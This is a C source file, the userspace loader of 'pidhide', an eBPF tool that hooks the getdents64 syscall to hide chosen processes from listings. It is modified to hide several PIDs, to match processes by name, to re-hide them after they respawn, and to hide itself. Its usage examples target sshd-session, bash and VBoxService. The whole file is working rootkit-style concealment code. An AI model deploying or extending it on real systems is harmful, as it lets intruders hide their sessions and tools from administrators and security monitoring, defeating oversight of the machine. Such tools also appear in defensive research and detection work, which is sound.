// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* Copyright (c) 2024 Crowdstrike */
/* Modified to support multiple PIDs, process name resolution, and periodic
 * re-resolution so a name-matched process that respawns with a new PID
 * (e.g. a crashed-and-restarted service) doesn't permanently fall out of
 * the hidden set just because it was only resolved once at startup. */
#include <argp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "common_um.h"
#include "pidhide.skel.h"

#define MAX_EXPLICIT_PIDS 16
#define MAX_DYNAMIC_PIDS 32
#define MAX_PID_LEN 10
#define MAX_PROC_NAMES 8
#define MAX_PROC_NAME_LEN 64

// Setup Argument stuff
static struct env {
    int explicit_pids[MAX_EXPLICIT_PIDS];
    int num_explicit_pids;
    char proc_names[MAX_PROC_NAMES][MAX_PROC_NAME_LEN];
    int num_proc_names;
    int target_ppid;
    int hide_self;  // Flag to hide pidhide itself
    int rescan_interval;
} env;

// Currently-inserted name-resolved PIDs (the set this process re-derives
// and diffs against on every rescan - NOT the explicit -p/-s ones, which
// are inserted once and never touched again).
static int dynamic_pids[MAX_DYNAMIC_PIDS];
static int num_dynamic_pids;

static int map_fd = -1;

const char *argp_program_version = "pidhide 3.0 (respawn-resilient)";
const char *argp_program_bug_address = "<sumukhchitloor18@gmail.com>";
const char argp_program_doc[] =
"PID Hider (Multi-PID Version)\n"
"\n"
"Uses eBPF to hide processes from usermode processes\n"
"By hooking the getdents64 syscall and unlinking the pid folder\n"
"\n"
"USAGE:\n"
"  ./pidhide -p 2222 -p 3333              # Hide specific PIDs\n"
"  ./pidhide -n sshd-session              # Hide all processes with this name\n"
"  ./pidhide -n sshd-session -p 1234      # Mix both methods\n"
"  ./pidhide -n sshd -n bash [-t 1111]    # Multiple process names\n"
"  ./pidhide -n sshd-session -s           # Also hide pidhide itself\n"
"  ./pidhide -n VBoxService --rescan-interval 5\n"
"\n"
"Process names are matched against /proc/<pid>/comm and re-resolved every\n"
"--rescan-interval seconds, so a process that respawns with a new PID\n"
"(crash/restart) stays hidden without restarting pidhide. There's a\n"
"detection-lag window of up to --rescan-interval seconds after a respawn\n"
"before the new PID is hidden - this trades instant coverage for not\n"
"needing a second BPF hook type. -p/-s PIDs are never rescanned.\n"
"If nothing specified, defaults to hiding this program's PID.\n";

static const struct argp_option opts[] = {
    { "pid-to-hide", 'p', "PID", 0, "Process ID to hide (can specify multiple)" },
    { "name", 'n', "NAME", 0, "Process name to hide - resolves to all matching PIDs (can specify multiple)" },
    { "target-ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children." },
    { "hide-self", 's', NULL, 0, "Also hide this pidhide process itself" },
    { "rescan-interval", 'r', "SECONDS", 0, "How often to re-resolve -n NAME entries (default: 2)" },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        if (env.num_explicit_pids >= MAX_EXPLICIT_PIDS) {
            fprintf(stderr, "Error: Maximum of %d explicit PIDs can be hidden\n", MAX_EXPLICIT_PIDS);
            argp_usage(state);
        }
        errno = 0;
        int pid = strtol(arg, NULL, 10);
        if (errno || pid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        env.explicit_pids[env.num_explicit_pids++] = pid;
        break;
    case 'n':
        if (env.num_proc_names >= MAX_PROC_NAMES) {
            fprintf(stderr, "Error: Maximum of %d process names can be specified\n", MAX_PROC_NAMES);
            argp_usage(state);
        }
        if (strlen(arg) >= MAX_PROC_NAME_LEN) {
            fprintf(stderr, "Error: Process name too long (max %d chars): %s\n", MAX_PROC_NAME_LEN - 1, arg);
            argp_usage(state);
        }
        strncpy(env.proc_names[env.num_proc_names], arg, MAX_PROC_NAME_LEN - 1);
        env.proc_names[env.num_proc_names][MAX_PROC_NAME_LEN - 1] = '\0';
        env.num_proc_names++;
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 's':
        env.hide_self = 1;
        break;
    case 'r':
        errno = 0;
        env.rescan_interval = strtol(arg, NULL, 10);
        if (errno || env.rescan_interval <= 0) {
            fprintf(stderr, "Invalid --rescan-interval: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

/* Builds the exact same fixed-size, zero-padded key bpf_probe_read_user_str()
 * produces on the kernel side reading d_name into char[MAX_PID_LEN] (after
 * pidhide.bpf.c's explicit memset there) - the zero-fill here must match
 * that convention byte-for-byte or the hash lookup silently never matches. */
static void pid_to_key(char key[MAX_PID_LEN], int pid)
{
    memset(key, 0, MAX_PID_LEN);
    snprintf(key, MAX_PID_LEN, "%d", pid);
}

static void map_insert_pid(int pid)
{
    char key[MAX_PID_LEN];
    __u8 val = 1;
    pid_to_key(key, pid);
    bpf_map_update_elem(map_fd, key, &val, BPF_ANY);
}

static void map_remove_pid(int pid)
{
    char key[MAX_PID_LEN];
    pid_to_key(key, pid);
    bpf_map_delete_elem(map_fd, key);
}

/*
 * Resolve a single process name to currently-matching PIDs by scanning
 * /proc/<pid>/comm. Writes into out[] and out_count (caller-owned, not global
 * state) so this can be reused for both the initial resolution and every
 * later rescan without entangling the two.
 */
static void resolve_pids_by_name(const char *proc_name, int *out, int *out_count, int max_out)
{
    DIR *proc_dir;
    struct dirent *entry;
    char comm_path[64];
    char comm_buf[MAX_PROC_NAME_LEN];
    FILE *fp;
    int my_pid = getpid();

    proc_dir = opendir("/proc");
    if (!proc_dir) {
        perror("Failed to open /proc");
        return;
    }

    while ((entry = readdir(proc_dir)) != NULL) {
        if (!isdigit((unsigned char)entry->d_name[0]))
            continue;

        int pid = atoi(entry->d_name);
        if (pid <= 0 || pid == my_pid)
            continue;

        if (*out_count >= max_out) {
            fprintf(stderr, "Warning: Hit max dynamic PID limit (%d), some processes may not be hidden\n", max_out);
            break;
        }

        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        fp = fopen(comm_path, "r");
        if (!fp)
            continue;  // Process might have died

        if (fgets(comm_buf, sizeof(comm_buf), fp) != NULL) {
            size_t len = strlen(comm_buf);
            if (len > 0 && comm_buf[len - 1] == '\n')
                comm_buf[len - 1] = '\0';

            if (strcmp(comm_buf, proc_name) == 0) {
                int duplicate = 0;
                for (int i = 0; i < *out_count; i++) {
                    if (out[i] == pid) {
                        duplicate = 1;
                        break;
                    }
                }
                if (!duplicate) {
                    out[(*out_count)++] = pid;
                }
            }
        }
        fclose(fp);
    }

    closedir(proc_dir);
}

/* Re-resolves all configured -n NAME entries, diffs the result against the
 * currently-tracked dynamic_pids set, and updates the BPF hash map so:
 *   - a newly-matching PID (just spawned/respawned) gets hidden
 *   - a PID that no longer matches (process exited) gets its entry removed
 * Removing stale entries isn't just tidiness - PIDs get recycled, so a
 * leftover entry could later hide an unrelated process that happens to
 * reuse the same PID number. */
static void rescan_dynamic_pids(void)
{
    int new_pids[MAX_DYNAMIC_PIDS];
    int num_new = 0;

    for (int i = 0; i < env.num_proc_names; i++) {
        resolve_pids_by_name(env.proc_names[i], new_pids, &num_new, MAX_DYNAMIC_PIDS);
    }

    for (int i = 0; i < num_new; i++) {
        int already_tracked = 0;
        for (int j = 0; j < num_dynamic_pids; j++) {
            if (dynamic_pids[j] == new_pids[i]) {
                already_tracked = 1;
                break;
            }
        }
        if (!already_tracked) {
            map_insert_pid(new_pids[i]);
        }
    }

    for (int j = 0; j < num_dynamic_pids; j++) {
        int still_present = 0;
        for (int i = 0; i < num_new; i++) {
            if (new_pids[i] == dynamic_pids[j]) {
                still_present = 1;
                break;
            }
        }
        if (!still_present) {
            map_remove_pid(dynamic_pids[j]);
        }
    }

    memcpy(dynamic_pids, new_pids, sizeof(int) * num_new);
    num_dynamic_pids = num_new;
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct pidhide_bpf *skel;
    int err;

    memset(&env, 0, sizeof(env));
    env.rescan_interval = 2;

    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err)
        return err;

    if (!setup()) {
        fprintf(stderr, "Failed to do common setup\n");
        return 1;
    }

    if (env.hide_self) {
        int my_pid = getpid();
        if (env.num_explicit_pids < MAX_EXPLICIT_PIDS) {
            env.explicit_pids[env.num_explicit_pids++] = my_pid;
            printf("Adding self (PID %d) to hide list\n", my_pid);
        } else {
            fprintf(stderr, "Warning: Cannot hide self, explicit PID limit reached\n");
        }
    }

    if (env.num_explicit_pids == 0 && env.num_proc_names == 0) {
        env.explicit_pids[0] = getpid();
        env.num_explicit_pids = 1;
        printf("No PIDs specified, defaulting to hiding self (PID %d)\n", env.explicit_pids[0]);
    }

    skel = pidhide_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    skel->rodata->target_ppid = env.target_ppid;

    err = pidhide_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    map_fd = bpf_map__fd(skel->maps.pids_to_hide_map);

    /* Populate explicit PIDs (never rescanned) */
    for (int i = 0; i < env.num_explicit_pids; i++) {
        map_insert_pid(env.explicit_pids[i]);
    }

    /* Initial resolution of -n NAME entries (refreshed periodically below) */
    if (env.num_proc_names > 0) {
        rescan_dynamic_pids();
        for (int i = 0; i < env.num_proc_names; i++) {
            printf("Resolved '%s' (will re-resolve every %ds)\n", env.proc_names[i], env.rescan_interval);
        }
    }

    if (env.num_explicit_pids == 0 && num_dynamic_pids == 0) {
        fprintf(stderr, "Error: No PIDs to hide\n");
        err = 1;
        goto cleanup;
    }

    /* Setup Maps for tail calls */
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    /* Attach tracepoints */
    err = pidhide_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    /* Set up ring buffer polling */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* Process events */
    printf("Successfully started!\n");
    printf("Hiding %d explicit PID(s) + %d name-resolved PID(s)\n",
           env.num_explicit_pids, num_dynamic_pids);

    time_t last_rescan = time(NULL);
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }

        if (env.num_proc_names > 0) {
            time_t now = time(NULL);
            if (now - last_rescan >= env.rescan_interval) {
                rescan_dynamic_pids();
                last_rescan = now;
            }
        }
    }

cleanup:
    /* Clean up */
    ring_buffer__free(rb);
    pidhide_bpf__destroy(skel);

    return err < 0 ? -err : 0;
}
